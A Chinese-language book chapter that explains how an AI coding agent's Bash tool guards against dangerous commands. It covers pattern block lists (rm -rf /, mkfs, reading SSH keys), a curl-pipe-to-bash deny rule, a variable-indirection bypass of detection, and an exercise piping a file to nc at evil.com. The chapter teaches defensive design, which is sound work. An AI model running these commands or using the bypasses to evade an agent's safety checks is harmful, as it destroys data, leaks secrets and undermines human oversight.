# 第13章：Bash 工具——最强大也最危险

## 为什么 Bash 工具特殊？

在所有工具中，Bash 工具是最强大的——它可以执行任意终端命令。这意味着它几乎能做任何事：安装软件包、运行测试、提交代码、甚至删除文件。

但"能做任何事"也意味着它**最危险**。一个 `rm -rf /` 命令就能删掉整个磁盘。因此，Bash 工具的实现是所有工具中最复杂的，安全检查代码比功能代码还多。

## 基本实现

Bash 工具的核心功能其实很简单：

```typescript
async function executeBash(command: string, timeout?: number) {
  const process = spawn("bash", ["-c", command], {
    cwd: workingDirectory,
    timeout: timeout || 120000,  // 默认 2 分钟超时
  })

  let stdout = ""
  let stderr = ""

  process.stdout.on("data", (data) => { stdout += data })
  process.stderr.on("data", (data) => { stderr += data })

  const exitCode = await waitForExit(process)

  return { stdout, stderr, exitCode }
}
```

就是启动一个子进程，执行命令，收集输出。几十行代码就能搞定。

但围绕这个核心功能，有超过 50 万行的安全、权限、沙箱代码。让我们看看为什么。

## 危险命令检测

Claude Code 维护了一个"危险命令"模式列表：

```typescript
const DANGEROUS_PATTERNS = [
  // 文件删除
  /rm\s+(-[rf]+\s+)*\//,           // rm -rf /
  /rm\s+(-[rf]+\s+)*~/,            // rm -rf ~

  // 磁盘操作
  /mkfs\./,                          // mkfs.ext4（格式化磁盘）
  /dd\s+if=.*of=\/dev/,             // dd 写入设备

  // 系统破坏
  /chmod\s+777\s+\//,               // 开放所有权限
  />\s*\/dev\/sda/,                  // 覆写磁盘

  // 密钥泄露
  /cat.*\.ssh\/.*key/,              // 读取 SSH 密钥
  /echo.*>.*authorized_keys/,       // 修改授权密钥
]
```

当检测到危险模式时，系统会：
1. 阻止自动执行
2. 向用户显示警告
3. 要求用户明确确认

但模式匹配不是万能的。一个聪明的命令可能绕过检测：

```bash
# 这个会被检测到
rm -rf /

# 这个可能不会（通过变量间接引用）
x=/; rm -rf $x
```

所以 Claude Code 还有更深层的安全措施。

## 命令分析：不只是字符串匹配

对于复杂的命令，简单的正则表达式不够用。Claude Code 会对命令进行更深入的分析：

```typescript
function analyzeCommand(command: string) {
  // 1. 分解管道命令
  const pipes = command.split("|").map(s => s.trim())

  // 2. 分析每个子命令
  for (const subCommand of pipes) {
    const [executable, ...args] = parseShellArgs(subCommand)

    // 3. 检查可执行文件
    if (isDangerousExecutable(executable)) {
      return { safe: false, reason: `${executable} 是危险命令` }
    }

    // 4. 检查参数
    if (hasDangerousArgs(executable, args)) {
      return { safe: false, reason: `参数组合有风险` }
    }

    // 5. 检查路径
    for (const arg of args) {
      if (isPathOutsideWorkdir(arg)) {
        return { safe: false, reason: `路径超出工作目录` }
      }
    }
  }

  return { safe: true }
}
```

### sed 命令的特殊处理

`sed` 是一个文本处理命令，常用来批量替换文件内容。它特别需要关注，因为它可以修改文件：

```bash
# 修改文件内容（in-place）
sed -i 's/old/new/g' file.txt
```

Claude Code 有专门的 sed 解析器（21,000 行代码！），它能理解 sed 命令的具体操作：

```typescript
function analyzeSedCommand(command: string) {
  // 解析 sed 表达式
  const sedScript = parseSedScript(command)

  // 检查：有 -i 标志吗？（会修改文件）
  if (sedScript.inPlace) {
    return { isReadOnly: false, modifiesFile: true }
  }

  // 没有 -i 就是只读的（只输出不修改）
  return { isReadOnly: true, modifiesFile: false }
}
```

## 权限规则

Bash 工具的权限系统支持细粒度的规则：

```json
{
  "permissions": {
    "alwaysAllow": [
      "Bash(git *)",        // 允许所有 git 命令
      "Bash(npm test *)",   // 允许 npm test
      "Bash(ls *)",         // 允许 ls
      "Bash(cat *)"         // 允许 cat
    ],
    "alwaysDeny": [
      "Bash(rm -rf *)",     // 禁止 rm -rf
      "Bash(curl * | bash)" // 禁止从网上下载并执行脚本
    ],
    "alwaysAsk": [
      "Bash(git push *)",   // push 前总是询问
      "Bash(npm publish *)" // 发布前总是询问
    ]
  }
}
```

规则使用通配符 `*` 来匹配：

```
"Bash(git *)" 匹配:
  ✅ git status
  ✅ git push origin main
  ✅ git log --oneline
  ❌ gitk（不是以 "git " 开头）
```

规则按优先级执行：deny > ask > allow。也就是说，如果一个命令同时匹配了 allow 和 deny 规则，deny 优先。

## 沙箱模式

在某些环境下，Bash 命令在**沙箱**中执行。沙箱就像一个"隔离房间"——命令在里面运行，不能影响外面的世界。

```
┌─────────────────────────────────┐
│           沙箱                   │
│                                  │
│  command → 只能访问工作目录       │
│           不能访问系统文件        │
│           不能修改网络设置        │
│           不能安装全局软件        │
│                                  │
└─────────────────────────────────┘
```

沙箱的实现取决于操作系统：
- **macOS**：使用 `sandbox-exec` 或 Apple 的 App Sandbox
- **Linux**：使用 `firejail` 或 Docker 容器

## 输出处理

Bash 命令的输出可能非常大。比如 `find /` 可能输出几百万行。Claude Code 需要处理这种情况：

```typescript
async function handleBashOutput(process, maxSize = 1_000_000) {
  let output = ""
  let truncated = false

  for await (const chunk of process.stdout) {
    output += chunk

    if (output.length > maxSize) {
      output = output.slice(0, maxSize)
      truncated = true
      process.kill()  // 停止命令，不再读取更多输出
      break
    }
  }

  if (truncated) {
    output += `\n\n[输出已截断，只显示前 ${maxSize} 个字符]`
  }

  return output
}
```

## 进度显示

长时间运行的命令会实时显示输出：

```
> Running: npm install
  ⠋ Installing dependencies...
  added 1,234 packages in 45s

  12 packages are looking for funding
    run `npm fund` for details
```

这通过流式读取子进程的输出来实现：

```typescript
async function* streamBashOutput(process) {
  for await (const chunk of process.stdout) {
    yield { type: "bash_progress", partial_output: chunk }
  }
}
```

每收到一块输出，就通过 `onProgress` 回调发送给界面，让用户实时看到命令的执行情况。

## 超时与后台执行

```typescript
// 默认超时：2 分钟
const DEFAULT_TIMEOUT = 120_000

// 用户可以指定更长的超时
const timeout = input.timeout || DEFAULT_TIMEOUT

// 后台执行（不阻塞交互）
if (input.run_in_background) {
  spawnBackground(command)
  return { data: "命令已在后台启动" }
}
```

有些命令需要运行很长时间（比如编译大项目）。后台执行模式让用户可以继续和 AI 对话，命令在后台默默运行。

## 只读模式检测

Claude Code 需要判断一个命令是"只读的"（只看不改）还是"可写的"（会修改东西）：

```typescript
const READ_ONLY_COMMANDS = [
  "ls", "cat", "head", "tail", "wc",
  "grep", "find", "which", "pwd",
  "echo", "date", "whoami",
  "git status", "git log", "git diff",
  "npm list", "node --version",
]

function isReadOnlyCommand(command: string): boolean {
  const executable = command.split(/\s+/)[0]
  return READ_ONLY_COMMANDS.some(cmd =>
    command.startsWith(cmd)
  )
}
```

只读命令可以：
- 跳过某些权限检查（提高速度）
- 并行执行（不会互相影响）
- 在权限受限模式下仍然允许

## 本章小结

- Bash 工具是最强大也最危险的工具
- 安全措施包括：危险命令检测、命令分析、sed 解析、权限规则、沙箱
- 权限规则支持通配符，优先级：deny > ask > allow
- 输出处理：截断大输出、流式进度显示
- 支持超时控制和后台执行
- 只读检测影响权限和并发策略

## 思考题

1. 如果你是攻击者，你能想到什么方式绕过危险命令检测？（这是安全研究人员常做的工作）
2. 为什么权限规则的优先级是 deny > ask > allow 而不是反过来？
3. 沙箱模式有什么缺点？（提示：有些合法操作也会被限制）

## 编程挑战：设计你自己的安全检测

如果你想练习安全思维，试试这个挑战：

设计一个函数 `isSafeCommand(command: string): boolean`，它接收一个 bash 命令，返回是否安全。

**Level 1**：检测明显的危险命令（`rm -rf /`、`mkfs` 等）
**Level 2**：检测路径穿越（`../../../etc/passwd`）
**Level 3**：检测管道中的危险操作（`cat file | nc evil.com 1234`）
**Level 4**：检测通过变量间接执行的危险（`x=/; rm -rf $x`）

每个 Level 的难度都会增加。你会发现，越深入就越难——这就是为什么 Claude Code 的安全代码有 50 万行。

安全不是一个可以"完全解决"的问题——它是一场永无止境的猫鼠游戏。但每多一层检测，就多一分安全。

下一章，我们将看看文件操作的三个工具：Read、Write 和 Edit。

---

*本书由 everettjf 使用 Claude Code 分析泄露源码编写 | 保留出处即可自由转载*
